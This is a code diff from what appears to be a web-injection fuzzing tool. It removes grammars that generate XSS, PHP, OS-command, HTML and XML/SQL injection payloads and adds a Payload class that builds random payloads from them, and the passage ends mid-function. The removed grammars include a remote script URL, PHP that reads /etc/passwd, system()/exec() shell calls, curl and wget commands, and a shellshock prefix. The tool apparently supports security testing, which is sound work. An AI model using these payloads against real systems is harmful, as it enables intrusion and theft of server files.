@@ -1,592 +1,274 @@
-class PayloadDict(object):
-    ### XSS Grammer ####
-    ebnfXSS = {
-        ### Injection Context ###
-        'root': (('directContext',),
-                 ('attributeContext',),
-                 ('eventContext',)),
-        'directContext': (('pre', 'leftSciptLabel', 'jsString', 'rightSciptLabel'),),
-        'attributeContext': (('terDQuote', 'wsp', 'srcAttr', 'terEqual', 'jsStatement', 'wsp'),
-                             ('pre', 'terLess', 'aTag', 'wsp', 'herfAttr', 'terEqual', 'jsStatement',
-                              'wsp', 'terGreater', 'rightALabel'),
-                             ('pre', 'terLess', 'iframeTag', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
-                              'wsp', 'terGreater'),
-                             ('pre', 'terLess', 'scriptTag', 'wsp', 'srcAttr', 'terEqual', 'jsFile',
-                              'wsp', 'terGreater', 'rightSciptLabel')),
-        'eventContext': (('terDQuote', 'wsp', 'eventStatement', 'wsp'),
-                         ('pre', 'terLess', 'tagAttr', 'wsp', 'eventStatement', 'wsp', 'terGreater')),
+import random
 
-        # Terminal
-        'terDQuote': (("\"",),),
-        'terSQuote': (("'",),),
-        'terLess': (('<',),),
-        'terGreater': (('>',),),
-        'terEqual': (("=",),),
-        'terBlank': (("[blank]",),
-                     ('%20',)),
-        'terSolidus': (("/",),
-                       ('%2f',)),
-        'terAdd': (("+",),),
-        'terTab': (('%09',),),
-        'terLF': (('%0A',),),
-        'terFF': (('%0C',),),
-        'terCR': (('%0D',),),
+from DaNuoYi.injection_utils.payload.payload_dict import PayloadDict
 
-        # XSS Syntax-repairing
-        'pre': (('terDQuote', 'terGreater'),
-                ('terSQuote', 'terGreater'),
-                ('terGreater',),
-                ('terBlank',)),
-        'wsp': (('terBlank',),
-                ('terSolidus',),
-                ('terAdd',),
-                ('terTab',),
-                ('terLF',),
-                ('terFF',),
-                ('terCR',)),
 
-        ### XSS label ###
-        'leftSciptLabel': (('terLess', 'scriptTag', 'terGreater'),),
-        'rightSciptLabel': (('terLess', 'terSolidus', 'scriptTag', 'terGreater'),),
-        'rightALabel': (('terLess', 'terSolidus', 'aTag', 'terGreater'),),
+class Payload(object):
 
-        ### XSS tag and attribute###
-        'scriptTag': (('charS', 'charC', 'charR', 'charI', 'charP', 'charT'),),
-        'aTag': (('charA',),),
-        'iframeTag': (('charI', 'charF', 'charR', 'charA', 'charM', 'charE'),),
-        'srcAttr': (('charS', 'charR', 'charC'),),
-        'herfAttr': (('charH', 'charE', 'charR', 'charF',),),
-        'tagAttr': (),
+    def __init__(self, dict_type, tag=None, cld=None, length=0, auto=True):
+        self.ctx = list()
+        self.ctx.append(tag)
+        self.injection = ''
+        self.cld = cld
+        self.tag = tag
 
-        # 'scriptTag': (('script',),),
-        # 'aTag': (('a',),),
-        # 'iframeTag': (('iframe',),),
-        # 'srcAttr': (('src',),),
-        # 'herfAttr': (('herf',),),
-        # 'tagAttr': (),
+        self.length = length
+        self.sub_ctx = None
+        self.target = None
+        self.i = 1
 
-        ###Javascript statement###
-        'jsString': (('alert(1)',),
-                     ('%61%6c%65%72%74%28%31%29',),
-                     ('&#x61;&#6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;',),
-                     ('&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59',)),
-        'jsFile': (('http://xss.rocks/xss.js',),
-                   ('%68%74%74%70%3A%2F%2F%78%73%73%2E%72%6F%63%6B%73%2F%78%73%73%2E%6A%73',),
-                   ('&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x72;\
-#&#x6F;&#x63;&#x6B;&#x73;&#x2F;&#x78;&#x73;&#x73;&#x2E;&#x6A;&#x73;',),
-                   ('&#104&#116&#116&#112&#58&#47&#47&#120&#115&#115&#46&#114&#111&#99&#107&#115\
-#&#47&#120&#115&#115&#46&#106&#115',)),
-        'jsStatement': (('javascript:', 'jsString',),
-                        ('%6A%61%76%61%73%63%72%69%70%74%3A', 'jsString',),
-                        ('&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;', 'jsString',),
-                        ('&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58', 'jsString',)),
+        if auto:
+            if dict_type.upper() == 'XSS':
+                self.generate_ctx('root', PayloadDict().ebnfXSS)
+                self.payload_dict = PayloadDict().ebnfXSS
+            elif dict_type.upper() == 'SQLI':
+                self.generate_ctx('root', PayloadDict().ebnfSQLi)
+                self.payload_dict = PayloadDict().ebnfSQLi
+            elif dict_type.upper() == 'PHPI':
+                self.generate_ctx('root', PayloadDict().ebnfPHPi)
+                self.payload_dict = PayloadDict().ebnfPHPi
+            elif dict_type.upper() == 'OSI':
+                self.generate_ctx('root', PayloadDict().ebnfOSi)
+                self.payload_dict = PayloadDict().ebnfOSi
+            elif dict_type.upper() == 'XMLI':
+                self.generate_ctx('root', PayloadDict().ebnfXMLi)
+                self.payload_dict = PayloadDict().ebnfXMLi
+            elif dict_type.upper() == 'HTMLI':
+                self.generate_ctx('root', PayloadDict().ebnfHTMLi)
+                self.payload_dict = PayloadDict().ebnfHTMLi
+            else:
+                print('Error injection task name!')
+            self.injection = self.generate_str(self.ctx)
+        else:
+            self.payload_dict = dict_type
 
-        ### HTML event ###
-        'eventStatement': (('eventAttr', 'terEqual', 'jsString'),),
-        'eventAttr': (),
+    def generate_ctx(self, tag, dictory):
+        if tag not in dictory.keys():
+            return tag
+        sub_table = dictory[tag]
+        cld = random.choice(sub_table) if len(sub_table) > 1 else sub_table[0]
+        children = dict(tag=tag, cld=cld, ctx=list())
+        children['ctx'].append(tag)
 
-        ### Letter ###
-        'charA': (('a',), ('%61',), ('%41',)),
-        'charB': (('b',), ('%62',), ('%42',)),
-        'charC': (('c',), ('%63',), ('%43',)),
-        'charD': (('d',), ('%64',), ('%44',)),
-        'charE': (('e',), ('%65',), ('%45',)),
-        'charF': (('f',), ('%66',), ('%46',)),
-        'charG': (('g',), ('%67',), ('%47',)),
-        'charH': (('h',), ('%68',), ('%48',)),
-        'charI': (('i',), ('%69',), ('%49',)),
-        'charJ': (('j',), ('%6a',), ('%4a',)),
-        'charK': (('k',), ('%6b',), ('%4b',)),
-        'charL': (('l',), ('%6c',), ('%4c',)),
-        'charM': (('m',), ('%6d',), ('%4d',)),
-        'charN': (('n',), ('%6e',), ('%4e',)),
-        'charO': (('o',), ('%6f',), ('%4f',)),
-        'charP': (('p',), ('%70',), ('%50',)),
-        'charQ': (('q',), ('%71',), ('%51',)),
-        'charR': (('r',), ('%72',), ('%52',)),
-        'charS': (('s',), ('%73',), ('%53',)),
-        'charT': (('t',), ('%74',), ('%54',)),
-        'charU': (('u',), ('%75',), ('%55',)),
-        'charV': (('v',), ('%76',), ('%56',)),
-        'charW': (('w',), ('%77',), ('%57',)),
-        'charX': (('x',), ('%78',), ('%58',)),
-        'charY': (('y',), ('%79',), ('%59',)),
-        'charZ': (('z',), ('%7a',), ('%5a',)),
-    }
+        for child in children['cld']:
+            temp = self.generate_ctx(child, dictory)[:]
+            children['ctx'].append(temp)
+        self.ctx = children['ctx']
+        self.length += 1
+        return children['ctx']
 
-    eventHandle = ['oncut', 'onblur', 'oncopy', 'ondrag', 'ondrop', 'onhelp', 'onload', 'onplay', 'onshow',
-                   'onabort', 'onclick', 'onclose', 'onended', 'onerror', 'onfocus', 'oninput', 'onkeyup',
-                   'onpaste', 'onpause', 'onreset', 'onwheel', 'onbounce', 'oncancel', 'onchange', 'onfinish',
-                   'ononline', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onselect', 'onsubmit', 'ontoggle',
-                   'onunload', 'oncanplay', 'ondragend', 'onemptied', 'onfocusin', 'oninvalid', 'onkeydown',
-                   'onmessage', 'onmouseup', 'onoffline', 'onplaying', 'onseeking', 'onstalled', 'onstorage',
-                   'onsuspend', 'onwaiting', 'onactivate', 'ondblclick', 'ondragover', 'onfocusout', 'onkeypress',
-                   'onmouseout', 'onpagehide', 'onpageshow', 'onpopstate', 'onprogress', 'ontouchend', 'onbeforecut',
-                   'oncuechange', 'ondragenter', 'ondragleave', 'ondragstart', 'onloadstart', 'onmousedown',
-                   'onmousemove', 'onmouseover', 'ontouchmove', 'onafterprint', 'onbeforecopy', 'ongestureend',
-                   'onhashchange', 'onloadeddata', 'onmouseenter', 'onmouseleave', 'onmousewheel', 'onratechange',
-                   'ontimeupdate', 'ontouchstart', 'onafterupdate', 'onbeforepaste', 'onbeforeprint', 'oncontextmenu',
-                   'ondevicelight', 'onmspointerup', 'ontouchcancel', 'onanimationend', 'onautocomplete',
-                   'onbeforeunload', 'onbeforeupdate', 'ondevicemotion', 'ongesturestart', 'onmsgestureend',
-                   'onmsgesturetap', 'onmspointerout', 'onvolumechange', 'oncontrolselect', 'ongesturechange',
-                   'onmsgesturehold', 'onmspointerdown', 'onmspointermove', 'onmspointerover', 'ontransitionend',
-                   'onuserproximity', 'onanimationstart', 'onbeforeactivate', 'oncanplaythrough', 'ondurationchange',
-                   'onlanguagechange', 'onloadedmetadata', 'onmsgesturestart', 'onmsinertiastart', 'onmspointerenter',
-                   'onmspointerhover', 'onmspointerleave', 'onbeforeeditfocus', 'ondeviceproximity',
-                   'onmsgesturechange',
-                   'onmspointercancel', 'onbeforedeactivate', 'onreadystatechange', 'onautocompleteerror',
-                   'ondeviceorientation', 'onorientationchange', 'onanimationiteration', 'onmozfullscreenerror',
-                   'onmsgesturedoubletap', 'onwebkitanimationend', 'onwebkitmouseforceup', 'onmozfullscreenchange',
-                   'onmozpointerlockerror', 'onwebkittransitionend', 'onmozpointerlockchange', 'onwebkitanimationstart',
-                   'onwebkitmouseforcedown', 'onwebkitwillrevealbottom', 'oncompassneedscalibration',
-                   'onwebkitmouseforcechanged', 'onwebkitanimationiteration', 'onwebkitmouseforcewillbegin']
-    tagHandle = ['a', 'b', 'i', 'p', 'q', 's', 'u', 'br', 'dd', 'dl', 'dt', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
-                 'hr', 'li', 'ol', 'rp', 'rt', 'td', 'th', 'tr', 'tt', 'ul', 'bdi', 'bdo', 'big', 'col', 'del', 'dfn',
-                 'dir', 'div', 'img', 'ins', 'kbd', 'map', 'nav', 'pre', 'sub', 'sup', 'svg', 'var', 'wbr', 'xmp',
-                 'abbr', 'area', 'base', 'body', 'cite', 'code', 'font', 'form', 'head', 'html', 'link', 'main',
-                 'mark', 'menu', 'meta', 'ruby', 'samp', 'span', 'time', 'aside', 'audio', 'embed', 'frame', 'image',
-                 'input', 'label', 'meter', 'param', 'small', 'style', 'table', 'tbody', 'tfoot', 'thead', 'title',
-                 'track', 'video', 'applet', 'button', 'canvas', 'center', 'dialog', 'figure', 'footer', 'header',
-                 'iframe', 'keygen', 'legend', 'object', 'option', 'output', 'script', 'select', 'source', 'strike',
-                 'strong', 'acronym', 'address', 'article', 'caption', 'details', 'isindex', 'listing', 'marquee',
-                 'section', 'summary', 'basefont', 'colgroup', 'datalist', 'fieldset', 'frameset', 'menuitem',
-                 'noframes', 'noscript', 'optgroup', 'progress', 'textarea', 'plaintext', 'blockquote', 'figcaption']
+    def traversal(self, ctx):
+        res = list()
+        for i in ctx:
+            if isinstance(i, list):
+                res.extend(self.traversal(ctx=i[1:]))
+            else:
+                res.append(i + ' ')
+        return res
 
-    ### PHPi Grammer ###
-    ebnfPHPi = {
-        ### Injection Context ###
-        'root': (('evalContext',),
-                 ('createFunctionContext',),
-                 # ('replaceContext',),
-                 ('serializeContext',)),
-        'evalContext': (('attack',),
-                        ('addslashesOpen', 'attack', 'addslashes')),
-        'createFunctionContext': (('terDigitZero', 'functionClose', 'attack'),),
-        # 'replaceContext': (('getPre', 'addslashesOpen', 'attack', 'addslashes'),
-        #                   ('noGetPre', 'addslashesOpen', 'attack', 'addslashes')),
-        'serializeContext': (('serializePre', 'serializePost'),),
+    def generate_str(self, ctx):
+        return ''.join(self.traversal(ctx)[1:])
 
-        ### Terminal ###
-        'addslashesOpen': (('char#', 'char{', 'char#', 'char{'),),
-        'addslashes': (('char}', 'char}'),),
-        'terDigitZero': (('0',),),
-        'functionClose': (('char)', ';', 'char}'),),
-        'serializePre': (('OorC', 'maohao', '[terDigitExcludingZero]', 'maohao', 'var'),),
-        'serializePost': (('char{', 'zimu', 'maohao', '[terDigitExcludingZero]', 'maohao', 'attack'),),
+    def get_tag_slice(self, ctx, tag):
+        res = list()
+        for i in range(len(ctx)):
+            if isinstance(ctx[i], list):
+                if ctx[i][0] == tag:
+                    res.append(ctx[i])
+                else:
+                    res.extend(self.get_tag_slice(ctx[i][1:], tag))
+        return res
 
-        'OorC': (('charO',),
-                 ('charC',),),
-        'maohao': ((':',),),
+    def get_index_slice(self, ctx, index=999, begin=True):
+        if begin:
+            self.i = 1
+        for j in ctx:
+            if isinstance(j, list):
+                self.i += 1
+                if self.i > index:
+                    self.target = j[0]
+                    self.sub_ctx = j
+                else:
+                    self.get_index_slice(j[1:], index, False)
+        return self.target, self.sub_ctx
 
-        ### Attack ###
-        'attack': (('phpPre', 'phpinfo()', 'phpPost'),
-                   ('phpPre', 'echo[blank]"what"', 'phpPost'),
-                   ('phpPre', '$fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo[blank]$result', 'phpPost'),
-                   ('phpPre', "system('", "shell", "')", 'phpPost'),
-                   ('phpPre', "exec('", "shell", "')", 'phpPost')),
+    def set_slice(self, option_slice, option, slices):
+        try:
+            # same tag
+            if option_slice[option][0] == slices[0]:
+                option_slice[option][1:] = slices[1:]
+            if option_slice[0] == slices[option][0]:
+                option_slice[1:] = slices[option][1:]
+            if option_slice[0] == slices[0]:
+                option_slice[1:] = slices[1:]
+        except Exception as e:
+            print('Index overstep: %s' % IndexError)
 
-        'phpPre': (('char<', '?', 'charP', 'charH', 'charP', 'wsp'), ('',)),
-        'phpPost': (('wsp', '?', 'char>'), ('',)),
+    def grammar_characteristics(self):
+        """
+        Calculate the characteristics of the grammar
+        :return: A dictionary containing grammar characteristics
+        """
+        num_productions = len([x for x in self.payload_dict if self.is_productive(x, set())])
+        num_terminals = len([y for x in self.payload_dict for y in self.payload_dict[x] if self.is_terminal(y)])
+        num_nonterminals = len([x for x in self.payload_dict if not self.is_terminal(x)])
+        num_recursive_productions = len([x for x in self.payload_dict if self.is_recursive(x, set())])
+        num_unproductive_symbols = len([x for x in self.payload_dict if self.is_non_productive(x, set())])
+        num_inaccessible_symbols = len([x for x in self.payload_dict if not self.is_accessible(x, 'root', set())])
 
-        'shell': (('/bin/cat', 'wsp', 'content'),
-                  ('usr/bin/tail', 'wsp', 'content'), ('usr/bin/wget', 'wsp', '127.0.0.1'), ('usr/bin/who',),
-                  ('usr/bin/whoami',), ('usr/local/bin/bash',),
-                  ('usr/local/bin/curl' 'wsp', '127.0.0.1',), ('usr/local/bin/nmap',), ('usr/local/bin/python',),
-                  ('usr/local/bin/ruby',), ('usr/local/bin/wget',),
-                  ('usr/bin/nice',), ('usr/bin/less',), ('usr/bin/more',), ('ping', 'wsp', '127.0.0.1'),
-                  ('sleep', 'wsp', '1')
-                  , ('ls',), ('ifconfig',), ('netstat',), ('systeminfo',), ('which', 'wsp', 'curl')),
-        'command': (('',), ('/etc/passwd',), ('/etc/shadow',)),
+        print("Number of Productions: %d" % num_productions)
+        print("Number of Terminals: %d" % num_terminals)
+        print("Number of Nonterminals: %d" % num_nonterminals)
+        print("Number of Recursive Productions: %d" % num_recursive_productions)
+        print("Number of Unproductive Symbols: %d" % num_unproductive_symbols)
+        print("Number of Inaccessible Symbols: %d" % num_inaccessible_symbols)
 
-        ### Letter ###
-        'charA': (('a',), ('%61',), ('%41',)),
-        'charB': (('b',), ('%62',), ('%42',)),
-        'charC': (('c',), ('%63',), ('%43',)),
-        'charD': (('d',), ('%64',), ('%44',)),
-        'charE': (('e',), ('%65',), ('%45',)),
-        'charF': (('f',), ('%66',), ('%46',)),
-        'charG': (('g',), ('%67',), ('%47',)),
-        'charH': (('h',), ('%68',), ('%48',)),
-        'charI': (('i',), ('%69',), ('%49',)),
-        'charJ': (('j',), ('%6a',), ('%4a',)),
-        'charK': (('k',), ('%6b',), ('%4b',)),
-        'charL': (('l',), ('%6c',), ('%4c',)),
-        'charM': (('m',), ('%6d',), ('%4d',)),
-        'charN': (('n',), ('%6e',), ('%4e',)),
-        'charO': (('o',), ('%6f',), ('%4f',)),
-        'charP': (('p',), ('%70',), ('%50',)),
-        'charQ': (('q',), ('%71',), ('%51',)),
-        'charR': (('r',), ('%72',), ('%52',)),
-        'charS': (('s',), ('%73',), ('%53',)),
-        'charT': (('t',), ('%74',), ('%54',)),
-        'charU': (('u',), ('%75',), ('%55',)),
-        'charV': (('v',), ('%76',), ('%56',)),
-        'charW': (('w',), ('%77',), ('%57',)),
-        'charX': (('x',), ('%78',), ('%58',)),
-        'charY': (('y',), ('%79',), ('%59',)),
-        'charZ': (('z',), ('%7a',), ('%5a',)),
-        'char$': (('$',), ('%23',)),
-        'char{': (('{',), ('%7b',)),
-        'char}': (('}',), ('%7d',)),
-        'char(': (('(',), ('%28',)),
-        'char)': ((')',), ('%29',)),
-        'char<': (('<',), ('%3C',)),
-        'char>': (('>',), ('%3E',)),
-        'wsp': (('[blank]',), ('%20',), ('/**/',))
-    }
+        return {
+            "Number of Productions": num_productions,
+            "Number of Terminals": num_terminals,
+            "Number of Nonterminals": num_nonterminals,
+            "Number of Recursive Productions": num_recursive_productions,
+            "Number of Unproductive Symbols": num_unproductive_symbols,
+            "Number of Inaccessible Symbols": num_inaccessible_symbols,
+        }
 
-    ### OS Command Injection Grammer ###
-    ebnfOSi = {
-        'root': (('pre', 'shell', 'post'),),
+    def is_recursive(self, symbol, visited):
+        """
+        Check if a symbol is recursive in the grammar
+        :param symbol: The symbol to check recursion for
+        :param visited: A set of visited symbols
+        :return: True if the symbol is recursive, False otherwise
+        """
+        if symbol in visited:
+            return True
+        visited.add(symbol)
 
-        'pre': (('var', 'post'),),
-        'var': (('',), ('0',)),
-        'post': ((';',), ('|',), ('||',), ('\n',), ('%0a',), ("'",), (')',), (');',), ('&',), ('$',), ('() { :;};',)),
+        for rule in self.payload_dict[symbol]:
+            for token in rule:
+                if token in self.payload_dict and self.is_recursive(token, visited):
+                    return True
+        visited.remove(symbol)
+        return False
 
-        'shell': (('/bin/cat', 'wsp', 'content'),
-                  ('usr/bin/tail', 'wsp', 'content'), ('usr/bin/wget', 'wsp', '127.0.0.1'), ('usr/bin/who',), ('usr/bin/whoami',), ('usr/local/bin/bash',),
-                  ('usr/local/bin/curl' 'wsp', '127.0.0.1',), ('usr/local/bin/nmap',), ('usr/local/bin/python',), ('usr/local/bin/ruby',), ('usr/local/bin/wget',),
-                  ('usr/bin/nice',), ('usr/bin/less',), ('usr/bin/more',), ('ping', 'wsp', '127.0.0.1'), ('sleep', 'wsp', '1')
-                  , ('ls',), ('ifconfig',), ('netstat',), ('systeminfo',), ('which', 'wsp', 'curl')),
-        'command': (('',), ('/etc/passwd',), ('/etc/shadow',)),
+    def is_productive(self, symbol, visited):
+        """
+              Check if a symbol is productive in the grammar
+              :param symbol: The symbol to check productivity for
+              :param visited: Set to keep track of visited symbols (used internally for recursion)
+              :return: True if the symbol is productive, False otherwise
+              """
+        if visited is None:
+            visited = set()  # 用于记录已经访问的符号
 
-        'wsp': (('[blank]',), ('%20',))
-    }
+        # 如果符号已经被访问过，直接返回
+        if symbol in visited:
+            return False
 
-    ### HTMLi Grammer ####
-    ebnfHTMLi = {
-        ### Injection Context ###
-        'root': (('iframe',),
-                 ('img',),
-                 ('form',),
-                 ('a',),
-                 ('video',),
-                 ('embed',)),
+        visited.add(symbol)
 
-        'iframe': (('terLess', 'iframeTag', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
-                    'wsp', 'terGreater'),),
-        'img': (('terLess', 'iframeImg', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
-                 'wsp', 'terGreater'),),
-        'form': (('terLess', 'iframeForm', 'wsp', 'actionAttr', 'terEqual', 'jsStatement', 'wsp',
-                  'methodAttr', 'terEqual', 'methodContent', 'wsp', 'terGreater'),),
-        'a': (('terLess', 'aTag', 'wsp', 'herfAttr', 'terEqual', 'jsStatement',
-               'wsp', 'terGreater', 'rightALabel'),),
-        'video': (('terLess', 'iframeVideo', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
-                   'wsp', 'terGreater'),),
-        'embed': (('terLess', 'iframeEmbed', 'wsp', 'srcAttr', 'terEqual', 'jsStatement',
-                   'wsp', 'terGreater'),),
+        # 检查每一个产生式规则，查看是否可以生成终结符串
+        for production in self.payload_dict[symbol]:
+            is_production_productive = True  # 假设产生式是可生成的
+            for token in production:
+                if token in self.payload_dict:
+                    if not self.is_productive(token, visited):
+                        is_production_productive = False
+                        break
+            if is_production_productive:
+                return True  # 如果至少有一个产生式是可生成的，返回True
 
-        ### Terminate ###
-        'iframeTag': (('charI', 'charF', 'charR', 'charA', 'charM', 'charE'),),
-        'iframeImg': (('charI', 'charM', 'charG'),),
-        'actionAttr': (('charA', 'charC', 'charT', 'charI', 'charO', 'charN'),),
-        'methodAttr': (('charM', 'charE', 'charT', 'charH', 'charO', 'charD'),),
-        'methodContent': (('charG', 'charE', 'charT'), ('charP', 'charO', 'charS', 'charT')),
-        'aTag': (('charA',),),
-        'herfAttr': (('charH', 'charE', 'charR', 'charF',),),
-        'tagAttr': (),
-        'rightALabel': (('terLess', 'terSolidus', 'aTag', 'terGreater'),),
-        'iframeVideo': (('charV', 'charI', 'charD', 'charE', 'charO'),),
-        'iframeEmbed': (('charE', 'charM', 'charB', 'charE', 'charD'),),
-        'wsp': (('terBlank',),
-                ('terSolidus',),
-                ('terAdd',),
-                ('terTab',),
-                ('terLF',),
-                ('terFF',),
-                ('terCR',)),
-        'srcAttr': (('charS', 'charR', 'charC'),),
-        'jsStatement': (('javascript:', 'jsString',),
-                        ('%6A%61%76%61%73%63%72%69%70%74%3A', 'jsString',),
-                        ('&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;', 'jsString',),
-                        ('&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58', 'jsString',)),
+        return False  # 如果所有产生式都不是可生成的，返回False
 
-        # Terminal
-        'terDQuote': (("\"",),),
-        'terSQuote': (("'",),),
-        'terLess': (('char<',),),
-        'terGreater': (('>',),),
-        'terEqual': (("=",),),
-        'terBlank': (("[blank]",),
-                     ('%20',)),
-        'terSolidus': (("/",),
-                       ('%2f',)),
-        'terAdd': (("+",),),
-        'terTab': (('%09',),),
-        'terLF': (('%0A',),),
-        'terFF': (('%0C',),),
-        'terCR': (('%0D',),),
+    def is_non_productive(self, symbol, visited=None):
+        """
+        Check if a symbol is non-productive in the grammar
+        :param symbol: The symbol to check non-productivity for
+        :param visited: Set to keep track of visited symbols (used internally for recursion)
+        :return: True if the symbol is non-productive, False otherwise
+        """
+        if visited is None:
+            visited = set()  # 用于记录已经访问的符号
 
-        ### Letter ###
-        'charA': (('a',), ('%61',), ('%41',)),
-        'charB': (('b',), ('%62',), ('%42',)),
-        'charC': (('c',), ('%63',), ('%43',)),
-        'charD': (('d',), ('%64',), ('%44',)),
-        'charE': (('e',), ('%65',), ('%45',)),
-        'charF': (('f',), ('%66',), ('%46',)),
-        'charG': (('g',), ('%67',), ('%47',)),
-        'charH': (('h',), ('%68',), ('%48',)),
-        'charI': (('i',), ('%69',), ('%49',)),
-        'charJ': (('j',), ('%6a',), ('%4a',)),
-        'charK': (('k',), ('%6b',), ('%4b',)),
-        'charL': (('l',), ('%6c',), ('%4c',)),
-        'charM': (('m',), ('%6d',), ('%4d',)),
-        'charN': (('n',), ('%6e',), ('%4e',)),
-        'charO': (('o',), ('%6f',), ('%4f',)),
-        'charP': (('p',), ('%70',), ('%50',)),
-        'charQ': (('q',), ('%71',), ('%51',)),
-        'charR': (('r',), ('%72',), ('%52',)),
-        'charS': (('s',), ('%73',), ('%53',)),
-        'charT': (('t',), ('%74',), ('%54',)),
-        'charU': (('u',), ('%75',), ('%55',)),
-        'charV': (('v',), ('%76',), ('%56',)),
-        'charW': (('w',), ('%77',), ('%57',)),
-        'charX': (('x',), ('%78',), ('%58',)),
-        'charY': (('y',), ('%79',), ('%59',)),
-        'charZ': (('z',), ('%7a',), ('%5a',)),
-        'char$': (('$',), ('%23',)),
-        'char{': (('{',), ('%7b',)),
-        'char}': (('}',), ('%7d',)),
-        'char(': (('(',), ('%28',)),
-        'char)': ((')',), ('%29',)),
-        'char<': (('<',), ('%3C',)),
-        'char>': (('>',), ('%3E',)),
+        # 如果符号已经被访问过，直接返回
+        if symbol in visited:
+            return False
 
-    }
+        visited.add(symbol)
 
-    ### XMLi Grammer ####
-    ebnfXMLi = {
-        ### Injection Context ###
-        'root': (('numericContext',),
-                 ('sQuoteContext',),
-                 ('dQuoteContext',)),
-        'numericContext': (('terDigitZero', 'wsp', 'booleanAttack', 'wsp'),
-                           ('terDigitZero', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDigitZero'),
-                           ('terDigitZero', 'par', 'wsp', 'sqliAttack', 'cmt'),),
-        'sQuoteContext': (('terSQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terSQuote'),
-                          ('terSQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terSQuote'),
-                          ('terSQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
-        'dQuoteContext': (('terDQuote', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'terDQuote'),
-                          ('terDQuote', 'par', 'wsp', 'booleanAttack', 'wsp', 'opOr', 'parOpen', 'terDQuote'),
-                          ('terDQuote', 'par', 'wsp', 'sqliAttack', 'cmt')),
-        'sqliAttack': (('unionAttack',),
-                       ('piggyAttack',),
-                       ('booleanAttack',)),
+        # 检查每一个产生式规则，查看是否可以生成终结符串
+        for production in self.payload_dict[symbol]:
+            is_production_productive = False  # 假设产生式不是可生成的
+            for token in production:
+                if token in self.payload_dict:
+                    if self.is_non_productive(token, visited):
+                        is_production_productive = True
+                        break
+            if is_production_productive:
+                return True  # 如果至少有一个产生式是可生成的，返回True
 
-        ### Piggy-backed Attacks ###
-        'piggyAttack': (('opSem', 'opSel', 'wsp', 'funcSleep'),),
+        return False  # 如果所有产生式都不是可生成的，返回False
 
-        ### Union Attacks ###
-        'cols': (('terDigitZero',),),
-        'unionPostfix': (("all", 'wsp'),
-                         ("distinct", 'wsp')),
-        'unionConf': (('opUni',),
-                      ('/*!', "50000", 'opUni', '*/')),
-        'unionAttack': (('unionConf', 'wsp', 'unionPostfix', 'opSel', 'wsp', 'cols'),
-                        ('unionConf', 'wsp', 'unionPostfix', 'parOpen', 'opSel', 'wsp', 'cols', 'par')),
+    def is_terminal(self, symbol):
+        """
+        Check if a symbol is a terminal
+        :param symbol: The symbol to check
+        :return: True if the symbol is a terminal, False otherwise
+        """
+        # If the symbol is not in the dictionary, it is a terminal
+        if symbol not in self.payload_dict:
+            return True
+        # If the symbol maps to a list containing a single string of length 1, it is a terminal
+        elif len(self.payload_dict[symbol]) == 1 and len(self.payload_dict[symbol][0]) == 1:
+            return True
+        else:
+            return False
 
-        # boolean values which evaluate to false
-        # falseConst = "false" | "fa" , [inlineCmt] , "lse";
-        'falseConst': (('false',),),
-        'falseAtom': (('wsp', 'falseConst'),
-                      ('wsp', 'terDigitZero'),
-                      ('terSQuote', 'terSQuote')),
-        'unaryFalse': (('falseAtom',),
-                       ('wsp', 'opNot', 'wsp', 'trueAtom'),
-                       ('wsp', 'opNot', 'opBinInvert', 'falseAtom')),
-        'booleanFalseExpr': (('unaryFalse',),),
-        'orAttack': (('opOr', 'booleanTrueExpr'),),
-        'andAttack': (('opAnd', 'booleanFalseExpr'),),
-        'booleanAttack': (('orAttack',),
-                          ('andAttack',)),
+    def is_accessible(self, symbol, current_symbol, visited):
+        """
+        Check if a symbol is accessible in the grammar
+        :param symbol: The symbol to check accessibility for
+        :return: True if the symbol is accessible, False otherwise
+        """
+        if current_symbol in visited:
+            return False  # 避免进入无限循环，如果已经访问过该符号，则返回False
+        visited.add(current_symbol)
 
-        ### Boolean-based Attacks ###
-        # boolean values which evaluate to true
-        # trueConst = "true" | "tr" , [inlineCmt] , "ue";
-        'trueConst': (('true',),),
-        'trueAtom': (('trueConst',),
-                     ('terDigitOne',)),
-        'unaryTrue': (('wsp', 'trueAtom'),
-                      ('wsp', 'opNot', 'wsp', 'falseAtom'),
-                      ('opBinInvert', 'wsp', 'falseAtom')),
-        'binaryTrue': (('unaryTrue', 'opEqual', 'wsp', 'parOpen', 'unaryTrue', 'par'),
-                       ('unaryFalse', 'opEqual', 'wsp', 'parOpen', 'unaryFalse', 'par'),
-                       ('terSQuote', 'terChar', 'terSQuote', 'opEqual', 'terSQuote', 'terChar', 'terSQuote'),
-                       ('terDQuote', 'terChar', 'terDQuote', 'opEqual', 'terDQuote', 'terChar', 'terDQuote'),
-                       ('unaryFalse', 'opLt', 'parOpen', 'unaryTrue', 'par'),
-                       ('unaryTrue', 'opGt', 'parOpen', 'unaryFalse', 'par'),
-                       ('wsp', 'trueAtom', 'wsp', 'opLike', 'wsp', 'trueAtom'),
-                       ('unaryTrue', 'wsp', 'opIs', 'wsp', 'trueConst'),
-                       ('unaryFalse', 'wsp', 'opIs', 'wsp', 'falseConst'),
-                       ('unaryTrue', 'opMinus', 'parOpen', 'unaryFalse', 'par')),
-        'booleanTrueExpr': (('unaryTrue',),
-                            ('binaryTrue',)),
+        # 检查当前符号的每一个产生式
+        for production in self.payload_dict[current_symbol]:
+            for token in production:
+                if token == symbol:
